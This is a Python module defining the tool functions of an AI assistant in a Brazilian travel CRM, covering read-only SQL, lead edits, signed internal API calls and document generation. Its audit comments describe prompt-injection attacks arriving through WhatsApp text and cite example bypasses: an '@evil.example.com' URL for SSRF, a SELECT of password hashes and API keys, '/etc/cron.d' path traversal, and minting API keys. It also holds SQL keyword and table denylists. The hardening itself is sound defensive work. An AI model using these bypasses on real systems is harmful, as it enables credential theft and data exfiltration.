import contextvars
import logging
import os
import pathlib
import re
import time
import uuid

import sqlalchemy as sa
from sqlalchemy.orm import Session
from sqlalchemy.orm.attributes import flag_modified
from sqlalchemy import text, create_engine
from sqlalchemy.exc import OperationalError, SQLAlchemyError
from app.database import engine, SessionLocal, IS_SQLITE
from app.config import DATABASE_URL, DATABASE_READONLY_URL, ENVIRONMENT
from app.models.lead import Lead
from app.models.tag import Tag
from app.models.task import Task
from app.models.user import User
from app.services.internal_ai_auth import (
    sign_internal_request,
    HEADER_USER_ID,
    HEADER_TIMESTAMP,
    HEADER_SIGNATURE,
)
import json
import urllib.request
import urllib.error
from urllib.parse import urlsplit

logger = logging.getLogger(__name__)

# Conexão read-only para queries SELECT da IA.
# AUDIT-2026-08-W1C (F5): `DATABASE_READONLY_URL` tem DEFAULT igual a
# `DATABASE_URL` (app/config.py). Se a env var não for definida em produção, o
# "engine read-only" seria construído com o usuário DONO do banco (read-write) e
# a garantia de somente-leitura da IA viraria ficção silenciosa. Aqui recusamos
# construir o engine nesse cenário: é preferível a ferramenta falhar em voz alta
# a executar SQL vindo do LLM (e de texto de cliente via n8n) com privilégio de
# escrita. Em `development` (SQLite/dev local) a igualdade é legítima.
_read_only_engine_error = None

if IS_SQLITE:
    # SQLite: usar URI mode com ?mode=ro para read-only
    _ro_url = DATABASE_URL.replace("sqlite:///", "sqlite:///file:", 1) + "?mode=ro&uri=true"
    _read_only_engine = create_engine(_ro_url, connect_args={"check_same_thread": False})
elif ENVIRONMENT != "development" and DATABASE_READONLY_URL == DATABASE_URL:
    _read_only_engine = None
    _read_only_engine_error = (
        "Consulta de leitura desativada: DATABASE_READONLY_URL não está "
        "configurada (está apontando para a mesma conexão de escrita). "
        "Configure o usuário crm_readonly no servidor."
    )
    logger.error(
        "[AI SQL READ] Engine read-only NÃO construído (AUDIT-2026-08-W1C/F5): "
        "DATABASE_READONLY_URL == DATABASE_URL fora de development — a IA "
        "rodaria SELECTs com o usuário dono do banco."
    )
else:
    # PostgreSQL: usar user dedicado read-only (crm_readonly) via DATABASE_READONLY_URL
    _read_only_engine = create_engine(
        DATABASE_READONLY_URL,
        pool_size=3,
        max_overflow=5,
        pool_pre_ping=True,
    )

# Contexto do usuário que está interagindo com a IA (PERPETUA-INTERNAL-AUTH-01).
# Usa contextvars (não estado global mutável — resolve ARCH-04/RM-01) para ser
# seguro sob concorrência async/threads: cada requisição enxerga o seu contexto.
_ai_user_context: "contextvars.ContextVar[dict | None]" = contextvars.ContextVar(
    "ai_user_context", default=None
)


def set_ai_user_context(user=None, *, user_id=None, email=None, role=None):
    """Define o contexto do usuário logado que está usando a IA.

    Aceita um objeto User (preferencial) ou campos explícitos. Guarda id/email/
    role para atribuição e para assinar as chamadas internas — NÃO depende mais
    de o usuário ter gerado uma API Key.
    """
    if user is not None:
        role_val = getattr(user, "role", None)
        ctx = {
            "user_id": getattr(user, "id", None),
            "email": getattr(user, "email", None),
            "role": getattr(role_val, "value", role_val),
        }
    else:
        ctx = {"user_id": user_id, "email": email, "role": role}
    _ai_user_context.set(ctx)


def clear_ai_user_context():
    """Limpa o contexto do usuário da IA de forma segura."""
    _ai_user_context.set(None)


def get_ai_user_context():
    """Retorna o contexto do usuário atual da IA (ou None)."""
    return _ai_user_context.get()

# =====================================================================
# Database Inspector Tool
# =====================================================================

# AUDIT-2026-08-W1C (F3): tabelas que a IA NUNCA pode ler. `users` guarda
# hashed_password/api_key; `chat_messages` guarda conversas privadas de outros
# usuários. Match por word boundary + case-insensitive (pega `FROM users`,
# `JOIN Users u`, `users.api_key`) e a query é REJEITADA, nunca reescrita.
_FORBIDDEN_TABLES = re.compile(r'\b(users|chat_messages)\b', re.IGNORECASE)


def get_database_schema() -> str:
    """
    Retorna o schema do banco de dados (tabelas e colunas importantes)
    útil para a IA saber as tabelas antes de executar uma busca (run_select_query).
    """
    schema = """
    Tabelas principais:
    - leads (id, nome, email, whatsapp, destinos [JSON], data_chegada, data_partida, status_venda, campos_personalizados [JSON], is_active, created_at, updated_at)
    - tags (id, nome, cor, created_at)
    - lead_tags (lead_id, tag_id)
    - tasks (id, title, description, due_date, status [pending, in_progress, completed], lead_id, assigned_to_id)
    - funnels (id, nome, descricao, is_default, is_active)
    - funnel_entries (id, funnel_id, lead_id, etapa_id [nova_oportunidade, contato_feito, em_negociacao, proposta_enviada, follow_up, fechou_venda, perda])
    - segments (id, nome, rules [JSON])

    OBS (AUDIT-2026-08-W1C/F3): as tabelas `users` e `chat_messages` NÃO estão
    disponíveis para consulta — contêm hashes de senha, API keys e histórico
    privado de conversas. Consultá-las é bloqueado no servidor.
    """
    return schema

def run_select_query(query: str) -> str:
    """
    Executa uma query SQL de LEITURA (SELECT) genérica no banco de dados.
    Nunca alterar dados usando essa ferramenta. Usar apenas para responder perguntas
    analíticas como "quantos leads temos?", "quantas tarefas estão em pending?".
    
    Args:
        query: A query SQL de leitura a ser executada.
    """
    query = query.strip().rstrip(";")
    
    # Bloquear múltiplos statements
    if ";" in query:
        return json.dumps({"error": "Apenas uma query por vez é permitida."})
    
    if not query.lower().startswith("select"):
        return json.dumps({"error": "Apenas consultas SELECT são permitidas."})
    
    # Bloquear subqueries destrutivas
    # AUDIT-2026-08-F2: `into` entrou na lista, junto de copy/grant/revoke.
    # `SELECT * INTO copia FROM leads` passava por TODOS os guards acima —
    # comeca com select, sem ponto e virgula, nenhuma palavra da lista antiga.
    # No SQLite isso e erro de sintaxe, entao a suite nunca viu problema; no
    # PostgreSQL e DDL: CRIA TABELA. Repare que `attach` e `pragma` so existem
    # no SQLite — a lista protegia o dialeto de desenvolvimento e deixava o de
    # producao aberto. Nenhuma consulta de leitura legitima usa INTO.
    _dangerous = re.compile(
        r'\b(insert|update|delete|drop|alter|create|attach|pragma|truncate'
        r'|into|copy|grant|revoke)\b',
        re.IGNORECASE,
    )
    if _dangerous.search(query):
        return json.dumps({"error": "Query contém palavras-chave não permitidas para leitura."})
    
    # AUDIT-2026-08-W1C (F3): não havia NENHUMA allowlist/denylist de tabelas e o
    # grant do banco é `SELECT ON ALL TABLES` (docker/postgres/init.sql), então
    # `SELECT email, hashed_password, api_key FROM users` passava por todos os
    # guards acima. Como a IA lê texto que chega do WhatsApp via n8n, uma prompt
    # injection bastava para exfiltrar hashes e API keys. Rejeitamos (não
    # sanitizamos: reescrever a query esconde a tentativa e é contornável).
    # NOTA: o fix REAL é revogar o grant no banco — ação de operador.
    if _FORBIDDEN_TABLES.search(query):
        logger.warning(f"[AI SQL READ BLOCKED] tabela sensível referenciada: {query[:200]}")
        return json.dumps({
            "error": (
                "Consulta bloqueada: as tabelas `users` e `chat_messages` contêm "
                "credenciais e conversas privadas e não podem ser lidas pela IA."
            )
        })

    # AUDIT-2026-08-W1C (F5): sem engine read-only confiável, não rodamos nada.
    if _read_only_engine is None:
        return json.dumps({"error": _read_only_engine_error})

    try:
        with _read_only_engine.connect() as conn:
            result = conn.execute(text(query))
            rows = [dict(row._mapping) for row in result.fetchmany(500)]  # Limitar resultados
            logger.info(f"[AI SQL READ] {query[:200]} -> {len(rows)} rows")
            return json.dumps(rows, default=str)
    except OperationalError:
        # Falha de conexão/autenticação no banco read-only (ex.: crm_readonly com
        # senha inválida, ou DATABASE_READONLY_URL mal configurada). NÃO vazar o
        # detalhe (pode conter host/usuário) — mensagem segura + log no servidor.
        logger.error(
            "[AI SQL READ] Banco read-only indisponível ou credenciais inválidas "
            "(verifique DATABASE_READONLY_URL / usuário crm_readonly)"
        )
        return json.dumps({
            "error": (
                "Não foi possível conectar ao banco de dados de leitura. "
                "Verifique a configuração DATABASE_READONLY_URL e o usuário "
                "crm_readonly no servidor. (detalhes técnicos registrados no log)"
            )
        })
    except SQLAlchemyError as e:
        # Erro de SQL (ex.: coluna/tabela inexistente): a mensagem do banco é útil
        # para a IA se autocorrigir e não contém segredos — mas truncamos.
        detail = str(getattr(e, "orig", e))
        logger.warning(f"[AI SQL READ ERROR] {query[:200]} -> {detail[:200]}")
        return json.dumps({"error": f"Erro na consulta: {detail[:300]}"})
    except Exception as e:
        logger.warning(f"[AI SQL READ ERROR] {query[:200]} -> {type(e).__name__}")
        return json.dumps({"error": "Erro inesperado ao executar a consulta de leitura."})

# run_sql_write_query REMOVIDO por segurança.
# A IA deve usar call_internal_api para todas as operações de escrita,
# passando pelas rotas oficiais que aplicam validações e auditoria.

# =====================================================================
# Operational Tools
# =====================================================================

# AUDIT-2026-08-W1C (F6): `status_venda` era uma string LIVRE vinda do LLM.
# `app/routers/analytics.py` só conta 'em_negociacao', 'venda' e 'perda' — um
# status inventado pela IA faz o lead sumir de TODOS os totais dos dashboards
# (não some do banco, some dos números que o gestor usa para decidir).
_ALLOWED_STATUS_VENDA = {"em_negociacao", "venda", "perda"}


def _require_ai_user_context():
    """AUDIT-2026-08-W1C (F6): retorna erro JSON se não houver usuário da IA.

    Estes 4 helpers abrem `SessionLocal()` e mutam o ORM direto, fora das rotas
    oficiais — sem authz, sem filtro de propriedade, sem auditoria, sem os
    efeitos colaterais do n8n (ver o comentário do próprio módulo logo acima de
    `update_lead_status`). Enquanto não são reescritos sobre `call_internal_api`,
    exigimos no mínimo um usuário identificado: escrita anônima disparada por
    prompt injection fica bloqueada e o log tem a quem atribuir.
    """
    ctx = get_ai_user_context()
    if not ctx or not ctx.get("user_id"):
        return json.dumps({
            "error": (
                "Operação de escrita bloqueada: contexto do usuário da IA ausente. "
                "Nenhuma alteração pode ser feita sem um usuário identificado."
            )
        })
    return None


def update_lead_status(lead_id: int, status_venda: str = None, cancel_reason: str = None) -> str:
    """
    Atualiza o campo status_venda de um lead existente.
    
    Args:
        lead_id: O ID do lead.
        status_venda: O novo status de venda. Apenas 'em_negociacao', 'venda' ou 'perda'.
        cancel_reason: Opcional, motivo caso seja perda.
    """
    denied = _require_ai_user_context()
    if denied:
        return denied

    # AUDIT-2026-08-W1C (F6): whitelist explícita — ver _ALLOWED_STATUS_VENDA.
    if status_venda and status_venda not in _ALLOWED_STATUS_VENDA:
        return json.dumps({
            "error": (
                f"status_venda inválido: '{status_venda}'. "
                f"Valores permitidos: {sorted(_ALLOWED_STATUS_VENDA)}."
            )
        })

    db = SessionLocal()
    try:
        lead = db.query(Lead).filter(Lead.id == lead_id).first()
        if not lead:
            return json.dumps({"error": f"Lead {lead_id} não encontrado."})

        if status_venda:
            lead.status_venda = status_venda

        if cancel_reason:
            if not lead.campos_personalizados:
                lead.campos_personalizados = {}
            lead.campos_personalizados['motivo_perda'] = cancel_reason
            # AUDIT-2026-08-W1C (F7): `campos_personalizados` é uma coluna JSON
            # simples (não MutableDict). Mutar o dict IN PLACE não marca o
            # atributo como sujo, então o commit não gerava UPDATE e o motivo da
            # perda era DESCARTADO — mas a ferramenta respondia "sucesso" para o
            # LLM. Só era visível quando o dict já tinha conteúdo (com dict vazio
            # a atribuição `= {}` acima já marcava o atributo).
            flag_modified(lead, "campos_personalizados")

        db.commit()
        return json.dumps({"success": True, "message": f"Lead {lead_id} atualizado."})
    finally:
        db.close()

def create_task(lead_id: int, title: str, description: str, due_date: str) -> str:
    """
    Cria uma nova tarefa associada a um lead.
    
    Args:
        lead_id: O ID do lead associado a tarefa.
        title: O título da tarefa.
        description: A descrição da tarefa.
        due_date: A data/hora limite da tarefa no formato YYYY-MM-DDTHH:MM:SS.
    """
    denied = _require_ai_user_context()
    if denied:
        return denied

    db = SessionLocal()
    try:
        from datetime import datetime
        dt = datetime.fromisoformat(due_date.replace("Z", ""))
        
        task = Task(
            title=title,
            description=description,
            due_date=dt,
            status="pending",
            lead_id=lead_id
        )
        db.add(task)
        db.commit()
        return json.dumps({"success": True, "message": f"Tarefa '{title}' criada para o lead {lead_id}."})
    except Exception as e:
        db.rollback()
        return json.dumps({"error": str(e)})
    finally:
        db.close()

def add_tag_to_lead(lead_id: int, tag_nome: str) -> str:
    """
    Adiciona uma tag ao lead e cria a tag caso ela não exista.
    """
    denied = _require_ai_user_context()
    if denied:
        return denied

    db = SessionLocal()
    try:
        tag_nome = tag_nome.strip()
        tag = db.query(Tag).filter(Tag.nome == tag_nome).first()
        if not tag:
            tag = Tag(nome=tag_nome, cor="#2B6CB0")
            db.add(tag)
            db.commit()
            db.refresh(tag)
        
        lead = db.query(Lead).filter(Lead.id == lead_id).first()
        if not lead:
            return json.dumps({"error": f"Lead {lead_id} não encontrado."})
            
        if tag not in lead.tags:
            lead.tags.append(tag)
            db.commit()
            
        return json.dumps({"success": True, "message": f"Tag '{tag_nome}' adicionada ao lead {lead_id}."})
    except Exception as e:
        db.rollback()
        return json.dumps({"error": str(e)})
    finally:
        db.close()

def create_lead(nome: str, email: str = None, whatsapp: str = None, destinos: str = None, data_chegada: str = None, data_partida: str = None, tag: str = None, status_venda: str = "em_negociacao") -> str:
    """
    Cria um novo lead rapidamente no sistema com base nos dados fornecidos.
    
    Args:
        nome: O nome do lead.
        email: Email do lead.
        whatsapp: WhatsApp do lead.
        destinos: Destinos, separados por vírgula (Ex: "Atacama, Uyuni").
        data_chegada: Data de chegada no formato YYYY-MM-DD.
        data_partida: Data de partida no formato YYYY-MM-DD.
        tag: Opcional, nome da tag principal a ser vinculada ao lead criado (Ex: "Atacama").
        status_venda: Status inicial do funil. Apenas 'em_negociacao', 'venda' ou 'perda'.
    """
    denied = _require_ai_user_context()
    if denied:
        return denied

    # AUDIT-2026-08-W1C (F6): mesmo defeito do update — status livre vindo do LLM
    # cria lead invisível para os dashboards já no nascimento.
    if status_venda not in _ALLOWED_STATUS_VENDA:
        return json.dumps({
            "error": (
                f"status_venda inválido: '{status_venda}'. "
                f"Valores permitidos: {sorted(_ALLOWED_STATUS_VENDA)}."
            )
        })

    db = SessionLocal()
    try:
        from datetime import datetime
        d_chegada = datetime.fromisoformat(data_chegada).date() if data_chegada else None
        d_partida = datetime.fromisoformat(data_partida).date() if data_partida else None
        lista_destinos = [d.strip() for d in destinos.split(",")] if destinos else []

        # AUDIT-2026-08-WB — mesmo defeito do F-341, aqui tambem.
        #
        # Esta ferramenta montava um `Lead(...)` cru e commitava: sem
        # `FunnelEntry`, sem `LeadHistory`, sem tag de origem. O lead nascia
        # FORA do Kanban — o pipeline so renderiza quem tem entry, e
        # `GET /api/pipeline/locate/{id}` devolve 404 sem ela. Um lead criado
        # pela Perpetua simplesmente nao existia para o time de vendas.
        #
        # Agora usa o mesmo `criar_lead` de `POST /api/leads` e do importador:
        # um caminho so, e ele nao pode divergir de novo.
        from app.services.lead_creation import criar_lead

        lead = criar_lead(
            db,
            dados={
                "nome": nome,
                "email": email,
                "whatsapp": whatsapp,
                "destinos": lista_destinos,
                "data_chegada": d_chegada,
                "data_partida": d_partida,
                "campos_personalizados": {},
                "status_venda": status_venda,
            },
            tag_nome=tag or None,
            origem="ia",
        )

        return json.dumps({"success": True, "lead_id": lead.id, "message": f"Lead '{nome}' criado."})
    except Exception as e:
        db.rollback()
        return json.dumps({"error": str(e)})
    finally:
        db.close()

def get_api_endpoints() -> str:
    """
    Retorna a lista de todos os endpoints REST disponíveis no sistema baseados na doc OpenAPI,
    incluindo um resumo dos campos necessários no corpo da requisição (JSON Payload).
    Use essa ferramenta antes de chamar call_internal_api para saber como montar a requisição perfeitamente.
    """
    try:
        req = urllib.request.Request("http://127.0.0.1:8000/openapi.json", headers={'Accept': 'application/json'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
        
        endpoints = []
        for path, methods in data.get("paths", {}).items():
            if not path.startswith("/api/"):
                continue
            for method, details in methods.items():
                desc = details.get("summary", "")
                
                # Extract payload info if available
                payload_info = ""
                try:
                    if "requestBody" in details:
                        content = details["requestBody"].get("content", {})
                        if "application/json" in content:
                            schema = content["application/json"].get("schema", {})
                            if "$ref" in schema:
                                ref_name = schema["$ref"].split("/")[-1]
                                model_schema = data.get("components", {}).get("schemas", {}).get(ref_name, {})
                                props = list(model_schema.get("properties", {}).keys())
                                if props:
                                    payload_info = f" | Payload JSON ({ref_name}): " + ", ".join(props)
                except Exception:
                    pass
                    
                endpoints.append(f"[{method.upper()}] {path} - {desc}{payload_info}")
                
        return json.dumps({"endpoints": endpoints})
    except Exception as e:
        return json.dumps({"error": f"Falha ao ler OpenAPI docs: {str(e)}"})

# AUDIT-2026-08-W1C (F1): o guard antigo (`path.startswith("http")` + `".." in
# path`) era contornado por um `@` inicial: `urlsplit(
# "http://127.0.0.1:8000@evil.example.com/steal").hostname == "evil.example.com"`.
# Como a requisição sai ASSINADA com os headers internos HMAC, uma prompt
# injection (texto de cliente vindo do WhatsApp/n8n) exfiltrava os dados E uma
# assinatura reutilizável por 300s. Agora exigimos um caminho com formato
# estrito; `@`, `\`, `//`, `:` e caracteres de controle ficam de fora do
# conjunto permitido. Query string é aceita separadamente.
_INTERNAL_PATH_RE = re.compile(r"^/[A-Za-z0-9_.~/-]*(\?[A-Za-z0-9_.~%=&+,:/-]*)?$")

# AUDIT-2026-08-W1C (F4): `POST /api/auth/token` emite uma API Key em texto
# puro, sem expiração e com privilégio total, e exige apenas `get_current_user`
# — que a identidade HMAC interna satisfaz. Ou seja, a Perpétua podia cunhar uma
# credencial permanente e imprimi-la no chat. Nenhuma rota /api/auth/ tem uso
# legítimo pela IA, e DELETE nunca é reversível: negados antes de assinar.
_DENIED_PATH_PREFIXES = ("/api/auth/",)
_DENIED_METHODS = {"DELETE"}

_BASE_INTERNAL_URL = "http://127.0.0.1:8000"


def _validate_internal_call(method: str, path: str):
    """Valida method/path de `call_internal_api`. Retorna erro (str) ou None.

    Exposto no módulo para permitir teste direto do guard (AUDIT-2026-08-W1C),
    sem depender de o servidor HTTP estar de pé.
    """
    if not isinstance(path, str) or not path.startswith("/") or path.startswith("//"):
        return "Path inválido. Use apenas caminhos relativos como /api/leads."
    if ".." in path or not _INTERNAL_PATH_RE.match(path):
        return "Path inválido. Use apenas caminhos relativos como /api/leads."

    method_u = str(method or "").upper()
    if method_u in _DENIED_METHODS:
        return f"Método {method_u} não é permitido para a IA."
    if any(path.lower().startswith(pfx) for pfx in _DENIED_PATH_PREFIXES):
        return "Acesso negado: rotas de autenticação não podem ser chamadas pela IA."

    # Cinto e suspensório: mesmo com o padrão acima aprovado, confirmamos que a
    # URL final resolve para o loopback. Foi exatamente a checagem de padrão que
    # falhou em F1 — a resolução do host é a defesa que não depende de regex.
    if urlsplit(_BASE_INTERNAL_URL + path).hostname != "127.0.0.1":
        return "Path inválido: a requisição interna deve permanecer em 127.0.0.1."

    return None


def call_internal_api(method: str, path: str, payload_json: str = None) -> str:
    """
    Faz uma requisição HTTP para a própria API do sistema.
    Isso te dá acesso a QUALQUER MÉTODO como se você fosse o frontend do sistema.
    A requisição usa o contexto de segurança do usuário atualmente logado.
    
    Args:
        method: O método HTTP (GET, POST, PUT). DELETE é bloqueado.
        path: O caminho do endpoint (ex: '/api/leads/segment'). Rotas /api/auth/ são bloqueadas.
        payload_json: Opcional. Uma string contendo um JSON válido para o body da requisição (ex: '{"nome": "João"}').
    """
    # Sanitizar method/path — prevenir SSRF e escalada de privilégio (F1/F4).
    denied = _validate_internal_call(method, path)
    if denied:
        logger.warning(f"[AI API CALL BLOCKED] {str(method).upper()} {str(path)[:200]} -> {denied}")
        return json.dumps({"error": denied})

    # Contexto do usuário logado (setado pelo router de AI). Não depende de API Key.
    ctx = get_ai_user_context()
    if not ctx or not ctx.get("user_id"):
        return json.dumps({
            "error": "Contexto do usuário da IA ausente. A requisição interna não pôde ser autenticada."
        })

    # Autenticação interna via HMAC assinado pelo servidor (backend-only secret).
    from app import config
    if not config.INTERNAL_AI_AUTH_SECRET:
        return json.dumps({
            "error": (
                "Autenticação interna da IA não está configurada no servidor "
                "(INTERNAL_AI_AUTH_SECRET ausente). Contate o administrador do sistema."
            )
        })

    method_u = method.upper()
    user_id = str(ctx["user_id"])
    timestamp = str(int(time.time()))
    signature = sign_internal_request(
        config.INTERNAL_AI_AUTH_SECRET, user_id, timestamp, method_u, path
    )

    url = _BASE_INTERNAL_URL + path

    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        HEADER_USER_ID: user_id,
        HEADER_TIMESTAMP: timestamp,
        HEADER_SIGNATURE: signature,
    }

    data = None
    if payload_json and payload_json.strip():
        data = payload_json.encode('utf-8')
    
    logger.info(f"[AI API CALL] {method.upper()} {path}")
        
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
        with urllib.request.urlopen(req) as response:
            response_data = response.read().decode()
            try:
                return json.dumps({"status": response.status, "data": json.loads(response_data)})
            except:
                return json.dumps({"status": response.status, "data": response_data})
    except urllib.error.HTTPError as e:
        response_data = e.read().decode()
        try:
            return json.dumps({"error_status": e.code, "details": json.loads(response_data)})
        except:
            return json.dumps({"error_status": e.code, "details": response_data})
    except Exception as e:
        return json.dumps({"error": str(e)})

# =====================================================================
# Document Generation Tools
# =====================================================================

UPLOAD_DIR = None

def _get_upload_dir():
    global UPLOAD_DIR
    if UPLOAD_DIR is None:
        import os
        UPLOAD_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "uploads")
        os.makedirs(UPLOAD_DIR, exist_ok=True)
    return UPLOAD_DIR

# AUDIT-2026-08-W1C (F2 / DOCUMENT-FILENAME-SECURITY-01, já registrado como
# pendência em docs/perpetua_pdf_generation.md): o nome do arquivo vem 100% do
# LLM e só passava por `.replace(' ', '_')`. `os.path.join(base, "/etc/cron.d/x")`
# DESCARTA a base quando o argumento é absoluto, e `../` não era removido — a
# escrita escapava de uploads/. O caminho de LEITURA (app/routers/ai.py) já usa
# `os.path.basename`; o buraco era só a escrita, nos dois geradores.
_SAFE_FILENAME_RE = re.compile(r"[^A-Za-z0-9_-]+")


def _safe_document_target(filename: str, extension: str):
    """Devolve (safe_filename, filepath) confinados ao diretório de uploads.

    Três camadas, na ordem: `os.path.basename` (mata `dir/`), whitelist estrita
    `[A-Za-z0-9_-]` limitada a 64 chars (mata `..`, `~`, absolutos, unicode,
    NUL) e, por último, verificação de que o caminho RESOLVIDO fica dentro da
    base — mesmo padrão de contenção de conversas/app/services/media_storage.py.
    A terceira camada existe porque foi justamente a validação de padrão que
    falhou nos achados deste pacote.
    """
    base = os.path.basename(str(filename or "")).replace(" ", "_")
    base = _SAFE_FILENAME_RE.sub("", base)[:64]
    if not base:
        base = "documento"

    safe_filename = f"{base}_{uuid.uuid4().hex[:6]}{extension}"
    upload_dir = pathlib.Path(_get_upload_dir()).resolve()
    filepath = (upload_dir / safe_filename).resolve()
    if not filepath.is_relative_to(upload_dir):
        raise ValueError("Nome de arquivo inválido (path traversal bloqueado).")
    return safe_filename, str(filepath)


def generate_excel_document(filename: str, sheet_name: str, headers: str, rows: str) -> str:
    """
    Gera um arquivo Excel (.xlsx) com os dados fornecidos e retorna o link para download.
    Use esta ferramenta quando o usuário pedir um relatório, lista ou dados em formato Excel/planilha.
    
    Args:
        filename: Nome do arquivo sem extensão (ex: 'relatorio_leads'). Será adicionado .xlsx automaticamente.
        sheet_name: Nome da aba/planilha (ex: 'Leads').
        headers: Cabeçalhos das colunas separados por '|' (ex: 'Nome|Email|Status').
        rows: Linhas de dados, cada linha separada por ';;' e cada coluna por '|' (ex: 'João|joao@email.com|Ativo;;Maria|maria@email.com|Inativo').
    """
    import os
    import uuid
    try:
        import openpyxl
        from openpyxl.styles import Font, PatternFill, Alignment, Border, Side

        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = sheet_name

        # Parse headers
        header_list = [h.strip() for h in headers.split("|")]
        
        # Estilizar cabeçalhos
        header_font = Font(bold=True, color="FFFFFF", size=11)
        header_fill = PatternFill(start_color="2B6CB0", end_color="2B6CB0", fill_type="solid")
        thin_border = Border(
            left=Side(style='thin'),
            right=Side(style='thin'),
            top=Side(style='thin'),
            bottom=Side(style='thin')
        )

        for col_idx, header in enumerate(header_list, 1):
            cell = ws.cell(row=1, column=col_idx, value=header)
            cell.font = header_font
            cell.fill = header_fill
            cell.alignment = Alignment(horizontal='center')
            cell.border = thin_border

        # Parse e inserir dados
        if rows and rows.strip():
            row_list = rows.split(";;")
            for row_idx, row_data in enumerate(row_list, 2):
                cols = [c.strip() for c in row_data.split("|")]
                for col_idx, value in enumerate(cols, 1):
                    cell = ws.cell(row=row_idx, column=col_idx, value=value)
                    cell.border = thin_border

        # Auto-ajustar largura das colunas
        for col in ws.columns:
            max_length = 0
            col_letter = col[0].column_letter
            for cell in col:
                try:
                    if cell.value:
                        max_length = max(max_length, len(str(cell.value)))
                except:
                    pass
            ws.column_dimensions[col_letter].width = min(max_length + 4, 50)

        # Salvar
        safe_filename, filepath = _safe_document_target(filename, ".xlsx")
        wb.save(filepath)

        # Validação pós-save: confirmar que o arquivo foi realmente salvo e é válido
        if not os.path.isfile(filepath):
            return json.dumps({"error": f"Falha ao salvar arquivo: {filepath} não existe após wb.save()"})
        
        saved_size = os.path.getsize(filepath)
        with open(filepath, "rb") as check_f:
            magic = check_f.read(4)
        
        if magic != b'PK\x03\x04':
            return json.dumps({"error": f"Arquivo salvo mas não é XLSX válido (magic bytes: {magic})"})
        
        print(f"[EXCEL_GEN] Arquivo gerado: {safe_filename} | {saved_size} bytes | path: {filepath}")

        download_url = f"/api/ai/download/{safe_filename}"
        return json.dumps({
            "success": True,
            "filename": safe_filename,
            "file_size_bytes": saved_size,
            "download_url": download_url,
            "message": f"Arquivo Excel gerado com sucesso! Link: {download_url}"
        })
    except Exception as e:
        import traceback
        traceback.print_exc()
        return json.dumps({"error": str(e)})

def generate_pdf_document(filename: str, title: str, content: str) -> str:
    """
    Gera um arquivo PDF com o conteúdo fornecido e retorna o link para download.
    Use esta ferramenta quando o usuário pedir um documento, relatório ou contrato em PDF.
    
    Args:
        filename: Nome do arquivo sem extensão (ex: 'relatorio_mensal'). Será adicionado .pdf automaticamente.
        title: Título do documento que aparecerá no topo do PDF.
        content: Conteúdo do documento. Use '\\n' para quebras de linha. Use '## ' no início de uma linha para subtítulos. Use '- ' no início para listas.
    """
    import os
    import uuid
    try:
        from fpdf import FPDF
        from fpdf.enums import XPos, YPos

        pdf = FPDF()
        pdf.add_page()
        pdf.set_auto_page_break(auto=True, margin=20)
        
        # Título
        pdf.set_font("Helvetica", "B", 18)
        pdf.set_text_color(43, 108, 176)  # Cor primária do CRM
        pdf.cell(0, 10, txt=str(title).encode('latin-1', 'replace').decode('latin-1'), border=0, ln=1, align="C")
        pdf.ln(2)
        
        # Linha decorativa
        pdf.set_draw_color(43, 108, 176)
        pdf.set_line_width(0.5)
        pdf.line(20, pdf.get_y(), 190, pdf.get_y())
        pdf.ln(6)
        
        # Data de geração
        from datetime import datetime
        pdf.set_font("Helvetica", "I", 9)
        pdf.set_text_color(128, 128, 128)
        pdf.cell(0, 6, txt=f"Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M')}", border=0, ln=1, align="R")
        pdf.ln(5)

        # Conteúdo
        content = str(content).encode('latin-1', 'replace').decode('latin-1')
        lines = content.split("\\n") if "\\n" in content else content.split("\n")
        
        for line in lines:
            line = line.strip()
            if not line:
                pdf.ln(4)
                continue
                
            if line.startswith("## "):
                pdf.set_font("Helvetica", "B", 13)
                pdf.set_text_color(43, 108, 176)
                pdf.cell(0, 8, txt=line[3:], border=0, ln=1)
                pdf.ln(1)
            elif line.startswith("- "):
                pdf.set_font("Helvetica", "", 10)
                pdf.set_text_color(50, 50, 50)
                pdf.cell(5, 6, txt="-", border=0, ln=0)
                # PERPETUA-PDF-FIX-01: sem new_x/new_y o fpdf2 deixa o cursor na
                # borda direita e o próximo multi_cell(0, ...) fica sem largura —
                # "Not enough horizontal space to render a single character".
                pdf.multi_cell(0, 6, txt=line[2:], new_x=XPos.LMARGIN, new_y=YPos.NEXT)
            else:
                pdf.set_font("Helvetica", "", 10)
                pdf.set_text_color(50, 50, 50)
                pdf.multi_cell(0, 6, txt=line, new_x=XPos.LMARGIN, new_y=YPos.NEXT)

        # Rodapé
        pdf.ln(10)
        pdf.set_font("Helvetica", "I", 8)
        pdf.set_text_color(150, 150, 150)
        pdf.cell(0, 6, txt="CRM Brasileiros no Atacama - Documento gerado automaticamente pela IA", border=0, ln=1, align="C")

        safe_filename, filepath = _safe_document_target(filename, ".pdf")
        pdf.output(filepath)

        download_url = f"/api/ai/download/{safe_filename}"
        return json.dumps({
            "success": True,
            "filename": safe_filename,
            "download_url": download_url,
            "message": f"PDF gerado com sucesso! Link: {download_url}"
        })
    except Exception:
        # Stack trace completo fica só no log interno; o usuário/LLM recebe uma
        # mensagem estável, sem detalhes de biblioteca, caminhos ou conteúdo.
        logger.exception("Erro ao gerar PDF")
        return json.dumps({
            "error": "Não foi possível gerar o PDF. Tente novamente ou solicite o conteúdo como texto no chat."
        })


# List of tools to pass to Gemini
AVAILABLE_TOOLS = [
    get_database_schema, run_select_query,
    update_lead_status, create_task, create_lead, add_tag_to_lead,
    get_api_endpoints, call_internal_api,
    generate_excel_document, generate_pdf_document
]

# Dictionary to map function names to actual functions during execution
TOOL_FUNCTIONS = {
    "get_database_schema": get_database_schema,
    "run_select_query": run_select_query,
    "update_lead_status": update_lead_status,
    "create_task": create_task,
    "create_lead": create_lead,
    "add_tag_to_lead": add_tag_to_lead,
    "get_api_endpoints": get_api_endpoints,
    "call_internal_api": call_internal_api,
    "generate_excel_document": generate_excel_document,
    "generate_pdf_document": generate_pdf_document,
}
